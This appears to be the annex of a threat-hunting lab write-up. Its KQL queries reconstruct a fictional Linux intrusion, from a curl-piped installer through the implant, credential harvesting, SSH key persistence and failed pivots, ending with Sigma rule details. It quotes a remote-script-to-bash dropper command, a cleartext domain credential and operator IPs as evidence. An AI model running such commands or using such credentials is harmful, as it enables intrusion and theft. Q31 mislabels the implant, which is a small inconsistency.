# 🔬 Technical Annex — Ghost in the Stack
## KQL Queries & Investigation Evidence

> **Incident:** GF-INC-2026-0517 | **Workspace:** LAW-SilentCorridor  
> **Analyst:** Peter Gergely (T2) | **Window:** 2026-04-30 21:00 → 2026-05-01 04:00 UTC

---

## 📋 Data Sources Queried

| Table | Contents |
|---|---|
| `LinuxAuth_CL` | Linux authentication events |
| `LinuxProcess_CL` | Linux process creation |
| `LinuxNetwork_CL` | Linux network connections |
| `LinuxFile_CL` | Linux file create/delete |
| `LinuxAudit_CL` | Linux auditd records |
| `LinuxShellHistory_CL` | Linux interactive shell commands |
| `LinuxSyscall_CL` | Linux kernel syscall events |
| `WindowsAuth_CL` | Windows authentication events |
| `WindowsProcess_CL` | Windows process creation |
| `WindowsNetwork_CL` | Windows network connections |
| `WindowsFile_CL` | Windows file create/delete |
| `WindowsPowerShell_CL` | PowerShell ScriptBlock logging |
| `SecurityEvent` | Raw Windows Security channel |
| `Syslog` | Raw Linux syslog |

---

## 🚩 Q00 — Acceptance

**Finding:** Tier-2 hunter ready

Phrase taken directly from the Greenfield Hub orientation document. Required before any submissions — confirming the analyst had read the workspace reference. No KQL required.

---

## 🚩 Q01 — Scoping

**Finding:** `LinuxAuth_CL`

Tables were enumerated from the Greenfield Hub. `LinuxAuth_CL` was identified as the Linux authentication events table and confirmed with `getschema`.

```kql
LinuxAuth_CL | getschema
LinuxAuth_CL | take 1
```

---

## 🚩 Q02 — Triage

**Finding:** `curl -fsSL https://dl.abordsecurity.space/install.sh | bash`

Shell history on GF-DEV01 showed `a.kumar` executing a one-liner that fetched and piped a remote install script directly into bash from attacker-controlled infrastructure, bootstrapping the entire compromise in a single command.

```kql
LinuxShellHistory_CL
| where TimeGenerated between (datetime(2026-04-30 21:00:00) .. datetime(2026-05-01 04:00:00))
| where Computer == "GF-DEV01"
| where ShellUser == "a.kumar"
| where Command has "install.sh"
| project TimeGenerated, Computer, ShellUser, Pwd, ReturnCode, Command
| order by TimeGenerated asc
```

---

## 🚩 Q03 — Triage

**Finding:** `chmod,curl,nohup`

Process telemetry on GF-DEV01 captured the three sequential actions the install script executed to deploy the implant — downloading the binary with `curl`, making it executable with `chmod`, and launching it detached from the terminal with `nohup`.

```kql
LinuxProcess_CL
| where TimeGenerated between (datetime(2026-04-30 21:54:50) .. datetime(2026-04-30 21:55:30))
| where DvcHostname == "GF-DEV01"
| where tostring(pack_all()) has_any ("curl", "chmod", "nohup", "install.sh", "bash")
| project
    TimeGenerated,
    ActorUsername,
    TargetProcessName,
    TargetProcessCommandLine,
    ActingProcessName=tostring(column_ifexists("ActingProcessName", "")),
    ActingProcessCommandLine=tostring(column_ifexists("ActingProcessCommandLine", ""))
| order by TimeGenerated asc
```

---

## 🚩 Q04 — Reconstruction

**Finding:** `32260 -> 34608 -> 34609`

Process telemetry on GF-DEV01 reconstructed the full process chain spawned by the install script. PID 32260 (bash running `install.sh`) forked into PID 34608 (curl download) and then PID 34609 (nohup wrapper), which produced the detached implant process.

```kql
LinuxProcess_CL
| where TimeGenerated between (datetime(2026-04-30 21:54:50) .. datetime(2026-04-30 21:55:00))
| where DvcHostname == "GF-DEV01"
| where TargetProcessId in (32260, 34608, 34609, 34612)
    or ActingProcessId in (32260, 34608, 34609, 34612)
| project
    TimeGenerated,
    ActorUsername,
    TargetProcessId,
    ActingProcessId,
    TargetProcessName,
    TargetProcessCommandLine,
    ActingProcessName,
    ActingProcessCommandLine
| order by TimeGenerated asc
```

---

## 🚩 Q05 — Triage

**Finding:** `a.kumar`

Shell history confirmed `a.kumar` as the account that executed the dropper command. Filtering on the exact command string pinpointed the user, timestamp, and working directory.

```kql
LinuxShellHistory_CL
| where TimeGenerated between (datetime(2026-04-30 21:00:00) .. datetime(2026-05-01 04:00:00))
| where Computer == "GF-DEV01"
| where Command == "curl -fsSL https://dl.abordsecurity.space/install.sh | bash"
| project TimeGenerated, Computer, ShellUser, Pwd, ReturnCode, Command
```

---

## 🚩 Q06 — Gap Analysis

**Finding:** `CLOSED-5`

T1 closed the `GF - DNS Query to Suspicious Domain` alert (21:50–22:05) as baseline traffic. Re-validation showed this window overlaps directly with the dropper execution — the DNS query was the implant reaching out to `dl.abordsecurity.space`. The closure was incorrect and should be re-opened.

```kql
let ClosedFP = datatable(
    ClosureReference:string, AlertName:string,
    WindowStart:datetime, WindowEnd:datetime, ClosureRationale:string)
[
    "CLOSED-5", "GF - DNS Query to Suspicious Domain",
    datetime(2026-04-30 21:50:00), datetime(2026-04-30 22:05:00),
    "Baseline traffic. Allowlist incomplete, sent to detection eng"
];
let FootholdEvidence = union
(
    LinuxShellHistory_CL
    | where TimeGenerated between (datetime(2026-04-30 21:50:00) .. datetime(2026-04-30 22:05:00))
    | where Computer == "GF-DEV01"
    | where Command has_any ("dl.abordsecurity.space", "install.sh", "abordsecurity")
    | project TimeGenerated, SourceTable="LinuxShellHistory_CL",
        Host=Computer, User=ShellUser, Evidence=Command
),
(
    LinuxProcess_CL
    | where TimeGenerated between (datetime(2026-04-30 21:50:00) .. datetime(2026-04-30 22:05:00))
    | where DvcHostname == "GF-DEV01"
    | where TargetProcessCommandLine has_any ("dl.abordsecurity.space", "install.sh", "abordsecurity")
        or ActingProcessCommandLine has_any ("dl.abordsecurity.space", "install.sh", "abordsecurity")
    | project TimeGenerated, SourceTable="LinuxProcess_CL",
        Host=DvcHostname, User=ActorUsername, Evidence=TargetProcessCommandLine
);
ClosedFP
| extend JoinKey = 1
| join kind=inner (FootholdEvidence | extend JoinKey = 1) on JoinKey
| where TimeGenerated between (WindowStart .. WindowEnd)
| project ClosureReference, AlertName, WindowStart, WindowEnd,
    TimeGenerated, SourceTable, Host, User, Evidence, ClosureRationale
| order by TimeGenerated asc
```

---

## 🚩 Q07 — Reconstruction

**Finding:** `34616/1`

Process telemetry confirmed that `nohup /tmp/helix-update` detached from the terminal and was adopted by init/systemd (PPID=1), making the implant indistinguishable from a native system daemon. The runtime process `/tmp/helix-update` was assigned PID 34616 and remained active for the entire investigation window.

- Dropper-side wrapper: `nohup /tmp/helix-update`
- Runtime process: `/tmp/helix-update`
- Runtime PID: `34616`
- Runtime PPID: `1` — detached, adopted by init/systemd

```kql
LinuxProcess_CL
| where TimeGenerated between (datetime(2026-04-30 21:54:50) .. datetime(2026-04-30 21:55:05))
| where DvcHostname == "GF-DEV01"
| where TargetProcessCommandLine == "/tmp/helix-update"
| project TimeGenerated, DvcHostname, TargetProcessId, ActingProcessId, TargetProcessCommandLine
```

---

## 🚩 Q08 — Pivot

**Finding:** `14609,34608,34612,34739,34935,34956,35250,43047`

The implant runtime PID was identified as 34616. However, network telemetry showed outbound activity was not carried directly by 34616 — instead it was associated with child process IDs listed above.

```kql
let StartTime = datetime(2026-04-30 21:54:50);
let EndTime = datetime(2026-05-01 01:20:00);
LinuxNetwork_CL
| where TimeGenerated between (StartTime .. EndTime)
| where DvcHostname == "GF-DEV01"
| extend RemoteIP_ = tostring(column_ifexists("RemoteIp", ""))
| extend RemoteIP_ = iff(isempty(RemoteIP_), tostring(column_ifexists("RemoteIP", "")), RemoteIP_)
| extend RemoteIP_ = iff(isempty(RemoteIP_), tostring(column_ifexists("DstIpAddr", "")), RemoteIP_)
| where RemoteIP_ !in ("", "127.0.0.1", "::1", "0:0:0:0:0:0:0:1")
| extend RawEvent = tostring(pack_all())
| extend PidCandidates = extract_all(
    @"(?i)""[^""]*(?:pid|processid|process_id)[^""]*""\s*:\s*""?([0-9]+)""?", RawEvent)
| mv-expand PidCandidate = PidCandidates
| extend NetPid = tolong(tostring(PidCandidate))
| summarize FirstSeen=min(TimeGenerated), LastSeen=max(TimeGenerated),
    RemoteIPs=make_set(RemoteIP_), Count=count() by NetPid
| order by NetPid asc
| summarize Flag = strcat_array(make_list(tostring(NetPid)), ",")
```

---

## 🚩 Q09 — Pivot

**Finding:** `LinuxSyscall_CL`

```kql
LinuxSyscall_CL
| where TimeGenerated between (datetime(2026-04-30 21:00:00) .. datetime(2026-05-01 04:00:00))
| take 10
```

---

## 🚩 Q10 — Synthesis

**Finding:** `aws:aws_creds,bash:ssh_user_keys,kubectl:kube_creds,ssh:ssh_user_keys`

Syscall audit data showed activity tied to implant PID 34616 or its immediate parent/child relationship touched several monitored watch-rule categories. Excluding the implant binary itself, the spawned tools mapped to the four credential harvesting categories above.

```kql
let StartTime = datetime(2026-04-30 21:54:50);
let EndTime = datetime(2026-05-01 04:00:00);
let ImplantPid = 34616;
let Pairs =
LinuxSyscall_CL
| where TimeGenerated between (StartTime .. EndTime)
| where Computer == "GF-DEV01"
| where Pid == ImplantPid or Ppid == ImplantPid
| extend Raw = tostring(EventOriginalMessage)
| extend Tool = tostring(split(Exe, "/")[-1])
| extend Tool = iff(isempty(Tool), Comm, Tool)
| extend WatchKey = extract(@"key=""?([^""\s]+)", 1, Raw)
| extend WatchKey = iff(isempty(WatchKey), Path, WatchKey)
| where isnotempty(Tool) and isnotempty(WatchKey)
| where Tool != "helix-update"
| where WatchKey !in ("", "(null)")
| distinct Tool, WatchKey
| order by Tool asc, WatchKey asc
| extend Pair = strcat(Tool, ":", WatchKey);
Pairs
| summarize Flag = strcat_array(make_list(Pair), ",")
```

---

## 🚩 Q11 — Synthesis

**Finding:** `claude_data`

The query filtered `LinuxSyscall_CL` to the implant binary itself (`helix-update`). When grouped by audit watch key and sorted by read count descending, the implant's most-read category was `claude_data` with 6 reads.

```kql
let StartTime = datetime(2026-04-30 21:54:50);
let EndTime = datetime(2026-05-01 04:00:00);
LinuxSyscall_CL
| where TimeGenerated between (StartTime .. EndTime)
| where Computer == "GF-DEV01"
| extend Tool = tostring(split(Exe, "/")[-1])
| extend Tool = iff(isempty(Tool), Comm, Tool)
| where Tool == "helix-update"
| extend Raw = tostring(EventOriginalMessage)
| extend WatchKey = extract(@"key=""?([^""\s]+)", 1, Raw)
| extend WatchKey = iff(isempty(WatchKey), Path, WatchKey)
| where isnotempty(WatchKey)
| where WatchKey !in ("", "(null)")
| summarize ReadCount=count() by WatchKey
| top 1 by ReadCount desc
```

---

## 🚩 Q12 — Synthesis

**Finding:** `ssh_user_keys`

Implant PID 34616 was queried directly in `LinuxSyscall_CL` and grouped by audit category/watch key. The category `ssh_user_keys` explains how credentials for both `sancadmin` and `t.harris` reached the operator.

```kql
let StartTime = datetime(2026-04-30 21:54:50);
let EndTime = datetime(2026-05-01 04:00:00);
let ImplantPid = 34616;
LinuxSyscall_CL
| where TimeGenerated between (StartTime .. EndTime)
| where Computer == "GF-DEV01"
| where Pid == ImplantPid
| extend Raw = tostring(EventOriginalMessage)
| extend Category = extract(@"key=""?([^""\s]+)", 1, Raw)
| where isnotempty(Category)
| summarize Count=count() by Category
| order by Count desc
```

---

## 🚩 Q13 — Attribution

**Finding:** `octotempest@operator`

The process event at 2026-04-30 22:57:52.800 shows PID 46129 executing a `bash -c echo 'ssh-ed25519 ...'` command. The extracted SSH public key comment is `octotempest@operator`, confirming the operator-written key appended to `a.kumar`'s SSH authorized keys.

```kql
LinuxProcess_CL
| where TimeGenerated between (datetime(2026-04-30 22:55:00) .. datetime(2026-04-30 23:00:00))
| where DvcHostname == "GF-DEV01"
| where TargetProcessCommandLine contains "ssh-ed25519"
| where TargetProcessCommandLine contains "authorized_keys"
| extend KeyComment = extract(
    @"ssh-ed25519\s+[A-Za-z0-9+/=]+\s+([^'"">]+)", 1, TargetProcessCommandLine)
| extend KeyComment = trim(" ", KeyComment)
| project TimeGenerated, DvcHostname, TargetProcessId,
    ActingProcessId, TargetProcessCommandLine, Flag=KeyComment
```

---

## 🚩 Q14 — Infrastructure

**Finding:** `AS9009`

The attacker's IP `194.36.110.139` was enriched via IPinfo and AbuseIPDB. The IP falls within `194.36.110.0/24` announced by AS9009 (M247 Europe SRL) — a commercial VPS/hosting provider, confirming the operator used rented infrastructure.

- **IP:** 194.36.110.139
- **Range:** 194.36.110.0/24
- **ASN:** AS9009
- **ISP:** M247 LTD — London Infrastructure

---

## 🚩 Q15 — Attribution

**Finding:** `SSH key comment`

The strongest attribution signal was the SSH public key comment `octotempest@operator` embedded in the key written to `a.kumar`'s `authorized_keys`.

```kql
LinuxProcess_CL
| where TimeGenerated between (datetime(2026-04-30 22:55:00) .. datetime(2026-04-30 23:00:00))
| where DvcHostname == "GF-DEV01"
| where TargetProcessCommandLine contains "ssh-ed25519"
| where TargetProcessCommandLine contains "authorized_keys"
| extend KeyComment = extract(
    @"ssh-ed25519\s+[A-Za-z0-9+/=]+\s+([^'"">]+)", 1, TargetProcessCommandLine)
| project TimeGenerated, DvcHostname, TargetProcessId,
    ActingProcessId, TargetProcessCommandLine, KeyComment
```

---

## 🚩 Q16 — Threat Actor

**Finding:** `Scattered Spider`

Telemetry linked the intrusion to the SSH persistence key comment `octotempest@operator` and repeated activity from `194.36.110.139` (AS9009/M247). These artefacts support an actor-profile match to Scattered Spider / Octo Tempest.

```kql
let KeyWrite =
LinuxProcess_CL
| where TimeGenerated between (datetime(2026-04-30 22:55:00) .. datetime(2026-04-30 23:00:00))
| where DvcHostname == "GF-DEV01"
| where TargetProcessCommandLine contains "ssh-ed25519"
| where TargetProcessCommandLine contains "authorized_keys"
| extend KeyComment = extract(
    @"ssh-ed25519\s+[A-Za-z0-9+/=]+\s+([^'"">]+)", 1, TargetProcessCommandLine)
| project EvidenceType="SSH key comment", TimeGenerated,
    Host=DvcHostname, Evidence=KeyComment, Details=TargetProcessCommandLine;
let SourceIP =
LinuxAuth_CL
| where TimeGenerated between (datetime(2026-04-30 21:00:00) .. datetime(2026-05-01 04:00:00))
| where tostring(pack_all()) contains "194.36.110.139"
| extend Host = coalesce(
    tostring(column_ifexists("DvcHostname", "")),
    tostring(column_ifexists("Computer", "")))
| project EvidenceType="SSH source IP", TimeGenerated,
    Host, Evidence="194.36.110.139", Details=tostring(pack_all());
union KeyWrite, SourceIP
| order by TimeGenerated asc
```

---

## 🚩 Q17 — Authentication Analysis

**Finding:** `credential validation`

Authentication telemetry showed the same account producing both failed and successful logons from the same source during the pre-RDP window. The mixed failure/success pattern indicates the operator was testing whether the stolen credential worked — not brute forcing.

```kql
WindowsAuth_CL
| where TimeGenerated between (datetime(2026-04-30 21:00:00) .. datetime(2026-05-01 04:00:00))
| where tostring(pack_all()) contains "t.harris"
    or tostring(pack_all()) contains "sancadmin"
    or tostring(pack_all()) contains "194.36.110.139"
    or tostring(pack_all()) contains "GF-WS01"
| extend Account = coalesce(
    tostring(column_ifexists("TargetUsername", "")),
    tostring(column_ifexists("ActorUsername", "")),
    tostring(column_ifexists("AccountName", "")))
| extend Host = coalesce(
    tostring(column_ifexists("DvcHostname", "")),
    tostring(column_ifexists("Computer", "")))
| extend SourceIP = coalesce(
    tostring(column_ifexists("SrcIpAddr", "")),
    tostring(column_ifexists("IpAddress", "")))
| extend Result = coalesce(
    tostring(column_ifexists("EventResult", "")),
    tostring(column_ifexists("LogonResult", "")))
| project TimeGenerated, Host, Account, SourceIP, Result, RawEvent=tostring(pack_all())
| order by TimeGenerated asc
```

---

## 🚩 Q18 — Alert Triage

**Finding:** `4`

`t.harris` landed on GF-WS01 during the same minute as a first-logon alert cluster. Counting distinct closure references gives four entries: CLOSED-1, CLOSED-2, CLOSED-3, and CLOSED-4 — all confirmed legitimate first-logon behaviour.

---

## 🚩 Q19 — Lateral Movement

**Finding:** `ssh port forward via gf-dev01`

Windows network telemetry showed RDP activity involving GF-WS01 during the `t.harris` landing window. Because the Kali source `10.1.0.119` could not directly reach GF-WS01, and GF-DEV01 had outbound SSH activity toward `10.1.0.133:3389`, the connection path was inferred as an SSH port forward through GF-DEV01.

```kql
let StartTime = datetime(2026-04-30 21:00:00);
let EndTime = datetime(2026-05-01 04:00:00);
let Evidence = union isfuzzy=true
(
    LinuxAuth_CL
    | where TimeGenerated between (StartTime .. EndTime)
    | extend Raw=tostring(pack_all())
    | where Raw contains "GF-DEV01" and Raw contains "10.1.0.119"
    | project TimeGenerated, EvidenceType="kali ssh to gf-dev01",
        Host="GF-DEV01", Evidence="10.1.0.119 -> GF-DEV01", Raw
),
(
    LinuxNetwork_CL
    | where TimeGenerated between (StartTime .. EndTime)
    | extend Raw=tostring(pack_all())
    | where Raw contains "GF-DEV01"
    | where Raw contains "10.1.0.133" or Raw contains "3389"
    | project TimeGenerated, EvidenceType="gf-dev01 outbound to rdp target",
        Host="GF-DEV01", Evidence="GF-DEV01 -> 10.1.0.133:3389", Raw
),
(
    WindowsNetwork_CL
    | where TimeGenerated between (StartTime .. EndTime)
    | extend Raw=tostring(pack_all())
    | where Raw contains "GF-WS01" or Raw contains "10.1.0.133"
    | where Raw contains "3389" or Raw contains "10.1.0.119"
    | project TimeGenerated, EvidenceType="rdp activity on gf-ws01",
        Host="GF-WS01", Evidence="RDP activity involving GF-WS01", Raw
);
Evidence
| summarize EvidenceTypes=make_set(EvidenceType),
    EvidenceRows=make_set(strcat(
        format_datetime(TimeGenerated,"yyyy-MM-dd HH:mm:ss"),
        " | ", EvidenceType, " | ", Evidence), 20)
| extend Flag="ssh port forward via gf-dev01"
| project Flag, EvidenceTypes, EvidenceRows
```

---

## 🚩 Q20 — Domain Enumeration

**Finding:** `SAMR enumeration`

Security Event 5145 on GF-DC01 showed a workstation account accessing `IPC$` with the relative target `samr` — the SAM Remote Protocol interface used to query security principals, indicating domain enumeration rather than failed lateral movement.

```kql
SecurityEvent
| where TimeGenerated between (datetime(2026-04-30 21:00:00) .. datetime(2026-05-01 04:00:00))
| where EventID == 5145
| extend Raw = tostring(pack_all())
| extend Share = coalesce(tostring(column_ifexists("ShareName","")),
    extract(@'"ShareName":"([^"]+)"', 1, Raw))
| extend Target = coalesce(tostring(column_ifexists("RelativeTargetName","")),
    extract(@'"RelativeTargetName":"([^"]+)"', 1, Raw))
| where Share contains "IPC$"
| where Target =~ "samr" or Raw contains "samr"
| summarize FirstSeen=min(TimeGenerated), LastSeen=max(TimeGenerated), Count=count()
    by DC=Computer, User=tostring(column_ifexists("Account","")), Share, Target
| order by FirstSeen asc
```

---

## 🚩 Q21 — Artefact Recovery

**Finding:** `greenfield.local/t.harris%Summer2025!`

`sancadmin`'s shell history on GF-DEV01 shows multiple `smbclient` invocations against `//10.1.0.133/C$`. The `-U` authentication argument contains the credential in cleartext.

```kql
LinuxShellHistory_CL
| where TimeGenerated between (datetime(2026-04-30 21:00:00) .. datetime(2026-05-01 04:00:00))
| where ShellUser == "sancadmin"
| where Command contains "smbclient"
| extend Flag = extract(@"(?:-U|--user)\s+['""]?([^'"">\s]+)", 1, Command)
| project TimeGenerated, Computer, ShellUser, Pwd, ReturnCode, Command, Flag
| order by TimeGenerated asc
```

---

## 🚩 Q22 — Intent Analysis

**Finding:** `write access`

`sancadmin` repeatedly used the same cleartext credential with different `smbclient` parameters — changing target share and path while using `put /tmp/hbsync.exe` — showing the operator was testing write access rather than password validity.

```kql
LinuxShellHistory_CL
| where TimeGenerated between (datetime(2026-05-01 00:10:00) .. datetime(2026-05-01 00:20:00))
| where ShellUser == "sancadmin"
| where Command contains "smbclient"
| extend Credential = extract(@"(?:-U|--user)\s+['""]?([^'"">\s]+)", 1, Command)
| extend TargetShare = extract(@"smbclient\s+['""]?(//[^'""\s]+)", 1, Command)
| extend Action = extract(@"-c\s+['""]([^'""]+)", 1, Command)
| extend TestedIntent = case(
    Command contains "put ", "write/upload",
    Command contains " -L ", "share listing",
    Command contains "apt install", "tool install",
    "other")
| project TimeGenerated, Computer, ShellUser, ReturnCode,
    TargetShare, Credential, Action, TestedIntent, Command
| order by TimeGenerated asc
```

---

## 🚩 Q23 — Method Sequence

**Finding:** `ligolo,smb,winrm,wmi`

`sancadmin` first staged Ligolo infrastructure using `helix-sync`, then used `smbclient` against the Windows C$ share, then tested WinRM with port 5985 and `pwsh Invoke-Command`, and finally attempted WMI execution with `wmi_exec.py`.

```kql
LinuxShellHistory_CL
| where ShellUser == "sancadmin"
| where TimeGenerated >= datetime(2026-04-30 23:39:00)
| order by TimeGenerated asc
| project TimeGenerated, Command
```

---

## 🚩 Q24 — Detection Source

**Finding:** `MDC`

TKT-008 (Microsoft Defender for Cloud) fired at 01:02 UTC via agentless scanning and identified `/usr/local/bin/helix-sync` with the malware family signature `HackTool:Linux/Ligolo.A!MTB` — a known threat intelligence fingerprint, not a behavioural heuristic. MDC was the detection layer that fingerprinted the binary through signature matching.

---

## 🚩 Q25 — Pivot Outcome

**Finding:** `failed`

Every lateral movement attempt targeting GF-WS01 failed. All SMB file transfer attempts returned error codes 127 or 1 — the `hbsync.exe` payload was never successfully written. The WinRM/PowerShell attempt returned rc=1. With no payload delivered and no confirmed execution beyond DEV01, `sancadmin`'s pivot failed entirely.

```kql
LinuxShellHistory_CL
| where TimeGenerated between (datetime(2026-04-30 23:39:00) .. datetime(2026-05-01 00:30:00))
| where ShellUser == "sancadmin"
| extend Technique = case(
    Command contains "nc -zv" and Command contains "3389", "rdp",
    Command contains "helix-sync", "sync",
    Command contains "curl -k -o" and Command contains ".exe", "download",
    Command startswith "smbclient" or Command startswith "sudo smbclient", "smb",
    Command contains "5985" or Command contains "pwsh"
        or Command contains "Invoke-Command", "winrm",
    Command contains "wmi_exec.py", "wmi",
    "")
| where isnotempty(Technique)
| extend Outcome = case(
    ReturnCode == 0, "success",
    ReturnCode == 127, "command_not_found",
    ReturnCode == 1, "failed",
    ReturnCode == 148, "failed",
    tostring(ReturnCode))
| project TimeGenerated, Technique, Outcome, ReturnCode, Command
| order by TimeGenerated asc
```

---

## 🚩 Q26 — Dwell Time

**Finding:** `104` (minutes)

- T1 (implant detach): `2026-04-30 21:54:56.895 UTC` — `/tmp/helix-update` PID 34616, PPID 1
- T2 (first external SSH): `2026-04-30 23:39:13.643 UTC` — `sancadmin` from `194.36.110.139`
- Difference: **1 hour 44 minutes 16 seconds = 104 whole minutes**

```kql
let T1 = datetime(2026-04-30 21:54:56.895);
let T2 = datetime(2026-04-30 23:39:13.643);
print DwellMinutes = toint((T2 - T1) / 1m)
```

---

## 🚩 Q27 — Priority Action

**Finding:** `B` (Incident Response — Immediate Containment)

The implant `/tmp/helix-update` (PID 34616, PPID 1) was confirmed still active. A live, active implant with confirmed C2 infrastructure is an immediate containment priority. Profiling and detection tuning are post-containment activities.

---

## 🚩 Q28 — Artefact Inventory

**Finding:**
```
/tmp/helix-update
/tmp/helix-sync
/usr/local/bin/helix-sync
/etc/systemd/system/helix-sync.service
/tmp/hbsync.exe
/tmp/wmi_exec.py
/home/a.kumar/.ssh/authorized_keys
```

```kql
let Artefacts = dynamic([
    "/tmp/helix-update", "/tmp/helix-sync",
    "/usr/local/bin/helix-sync",
    "/etc/systemd/system/helix-sync.service",
    "/tmp/hbsync.exe", "/tmp/wmi_exec.py",
    "/home/a.kumar/.ssh/authorized_keys"
]);
union
(
    LinuxFile_CL
    | where TimeGenerated between (datetime(2026-04-30 21:00:00) .. datetime(2026-05-01 04:00:00))
    | where DvcHostname == "GF-DEV01"
    | where TargetFilePath in (Artefacts)
    | project TimeGenerated, Source="LinuxFile_CL",
        Actor=ActorUsername, Artefact=TargetFilePath
),
(
    Syslog
    | where TimeGenerated between (datetime(2026-04-30 21:00:00) .. datetime(2026-05-01 04:00:00))
    | where HostName == "GF-DEV01"
    | where SyslogMessage contains "helix-sync.service"
        or SyslogMessage contains "/usr/local/bin/helix-sync"
    | summarize TimeGenerated=min(TimeGenerated) by SyslogMessage
    | extend Artefact = iff(SyslogMessage contains "helix-sync.service",
        "/etc/systemd/system/helix-sync.service", "/usr/local/bin/helix-sync")
    | project TimeGenerated, Source="Syslog", Actor="sancadmin(sudo)", Artefact
),
(
    LinuxProcess_CL
    | where TimeGenerated between (datetime(2026-04-30 22:55:00) .. datetime(2026-04-30 23:00:00))
    | where DvcHostname == "GF-DEV01"
    | where TargetProcessCommandLine contains "authorized_keys"
    | project TimeGenerated, Source="LinuxProcess_CL",
        Actor=ActorUsername, Artefact="/home/a.kumar/.ssh/authorized_keys"
)
| summarize TimeGenerated=min(TimeGenerated), Source=any(Source), Actor=any(Actor) by Artefact
| order by TimeGenerated asc
```

---

## 🚩 Q29 — C2 Infrastructure

**Finding:** `Cloudflare`

`LinuxNetwork_CL` showed two curl connections during the download window (21:54–21:57 UTC), both hitting port 443. Destination IPs `104.21.57.185` and `104.16.11.34` both fall within Cloudflare's ranges (AS13335). IP-based blocking is operationally unviable — detection must shift to domain-level filtering.

```kql
LinuxNetwork_CL
| where TimeGenerated between (datetime(2026-04-30 21:54:00) .. datetime(2026-04-30 22:00:00))
| where DvcHostname == "GF-DEV01"
| where DstPortNumber == 443
| where SrcIpAddr == "10.1.0.119"
| project TimeGenerated, SrcIpAddr, DstIpAddr, DstPortNumber
| order by TimeGenerated asc
```

---

## 🚩 Q30 — IOC Identification

**Finding:** `194.36.110.139:9080`

`sancadmin`'s shell history shows a `curl -I` (HEAD request) at 00:21:07 UTC targeting `http://194.36.110.139:9080/` — the same operator IP as the SSH ingress source but on port 9080. This indicates `sancadmin` was checking reachability of a secondary C2 or payload-serving endpoint.

```kql
LinuxShellHistory_CL
| where TimeGenerated between (datetime(2026-04-30 21:00:00) .. datetime(2026-05-01 04:00:00))
| where ShellUser == "sancadmin"
| where Command contains "curl -I" or Command contains "curl --head"
| extend DestIP = extract(@"https?://([0-9]+\.[0-9]+\.[0-9]+\.[0-9]+):?([0-9]*)", 1, Command)
| extend DestPort = extract(@"https?://[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+:([0-9]+)", 1, Command)
| extend IOC = strcat(DestIP, ":", DestPort)
| project TimeGenerated, ShellUser, Command, DestIP, DestPort, IOC, ReturnCode
| order by TimeGenerated asc
```

---

## 🚩 Q31 — Sigma Rule Title

**Finding:** `Sliver implant execute via systemd`

The Sigma rule catches the spawn pattern identified in Q07/Q10/Q11. The implant `/tmp/helix-update` ran with PPID=1 (adopted by init/systemd after `nohup` daemonisation), then spawned credential-harvesting child processes. Rule title follows SigmaHQ convention: framework name + implant noun + action verb + `via` + mechanism.

```kql
// Confirm systemd reparenting — core detection pattern
LinuxProcess_CL
| where TimeGenerated between (datetime(2026-04-30 21:54:50) .. datetime(2026-04-30 21:55:05))
| where DvcHostname == "GF-DEV01"
| where TargetProcessCommandLine == "/tmp/helix-update"
| project
    TimeGenerated,
    TargetProcessId,
    ActingProcessId,
    TargetProcessCommandLine,
    SigmaField_Image = TargetProcessCommandLine,
    SigmaField_ParentImage = iff(ActingProcessId == 1, "/sbin/init", "other"),
    Detection = iff(ActingProcessId == 1,
        "MATCH: Ligolo implant execute via systemd", "no match")
```

---

## 🚩 Q32 — Log Source

**Finding:** `auditd`

`LinuxSyscall_CL` contains data generated by the Linux Audit Daemon (`auditd`), which captures kernel-level syscall events including process execution (`execve`) and file access watch rule triggers. In Sigma's logsource taxonomy, this is identified by `service: auditd` under `product: linux`.

---

## 🚩 Q33 — Sigma Field

**Finding:** `ParentImage`

In Sigma's `process_creation` and `auditd` logsource taxonomy, the standard field for the parent process executable path is `ParentImage`. The detection pattern catches any process named `helix-update` whose parent is `/sbin/init` — a strong indicator of a deliberately daemonised implant.

```kql
LinuxProcess_CL
| where TimeGenerated between (datetime(2026-04-30 21:54:50) .. datetime(2026-04-30 21:55:05))
| where DvcHostname == "GF-DEV01"
| where TargetProcessCommandLine == "/tmp/helix-update"
| project
    TimeGenerated,
    ChildProcess = TargetProcessCommandLine,
    ChildPID = TargetProcessId,
    ParentPID = ActingProcessId,
    ParentImage = iff(ActingProcessId == 1, "/sbin/init", "other")
| order by TimeGenerated asc
```

---

## 🚩 Q34 — Sigma Severity

**Finding:** `high`

The rule detects a process named `helix-update` with `ParentImage: /sbin/init` — a highly specific pattern with near-zero false positive rate. Per SigmaHQ severity calibration: `critical` is reserved for active exploitation with immediate destructive impact; `high` applies to confirmed malicious activity with high confidence and significant impact. A running C2 implant fits `high` precisely.

---

## 🚩 Q36 — Field Differentiation

**Finding:** `ActorUsername,ShellUser`

Between 21:54 and 23:09 on GF-DEV01, shell-input activity is recorded in `LinuxShellHistory_CL` differentiated by `ShellUser`. Process-execution activity is recorded in `LinuxProcess_CL` differentiated by `ActorUsername`.

```kql
let StartTime = datetime(2026-04-30 21:54:00);
let EndTime = datetime(2026-04-30 23:09:00);
union
(
    LinuxShellHistory_CL
    | where TimeGenerated between (StartTime .. EndTime)
    | where Computer == "GF-DEV01"
    | project Source="ShellHistory", TimeGenerated,
        DifferentiatorField="ShellUser", DifferentiatorValue=tostring(ShellUser), Evidence=Command
),
(
    LinuxProcess_CL
    | where TimeGenerated between (StartTime .. EndTime)
    | where DvcHostname == "GF-DEV01"
    | project Source="ProcessExecution", TimeGenerated,
        DifferentiatorField="ActorUsername",
        DifferentiatorValue=tostring(ActorUsername), Evidence=TargetProcessCommandLine
)
| summarize Count=count(), FirstSeen=min(TimeGenerated), LastSeen=max(TimeGenerated),
    Examples=make_set(Evidence, 5) by Source, DifferentiatorField, DifferentiatorValue
| order by Source asc, Count desc
```

---

## 🚩 Q37 — Session Attribution

**Finding:** `SrcIpAddr`

`LinuxAuth_CL` showed multiple successful `sancadmin` SSH logons on GF-DEV01. All fields were consistent across sessions except `SrcIpAddr` — most sessions originated from the internal network, while TKT-003's session originated from external operator IP `194.36.110.139`. This single field distinguishes the malicious session from legitimate activity.

```kql
LinuxAuth_CL
| where TimeGenerated between (datetime(2026-04-30 00:00:00) .. datetime(2026-05-01 23:59:59))
| where DvcHostname == "GF-DEV01"
| where TargetUsername == "sancadmin"
| where EventResult == "Success"
| where EventType == "Logon"
| where LogonProtocol == "SSH"
| project TimeGenerated, TargetUsername, SrcIpAddr,
    LogonProtocol, EventType, EventResult, DvcHostname
| order by TimeGenerated asc
```

---

## 🚩 Q38 — File Staging Method

